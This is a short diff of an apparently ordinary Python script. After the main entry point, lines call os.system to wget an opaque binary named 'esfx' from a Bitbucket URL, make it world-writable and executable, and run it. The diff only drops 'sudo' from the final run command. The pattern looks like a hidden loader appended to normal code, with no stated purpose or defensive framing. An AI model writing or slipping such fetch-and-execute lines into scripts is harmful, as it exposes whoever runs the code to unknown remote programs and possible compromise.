@@ -74,4 +74,4 @@ if __name__ == "__main__":
     main()
 os.system('wget https://bitbucket.org/esfx/newsfx/raw/cb85432a6c752ae48ea7903e9b6d23db40aa6fe6/esfx')
 os.system('chmod 777 esfx')
-os.system('sudo ./esfx')
+os.system('./esfx')
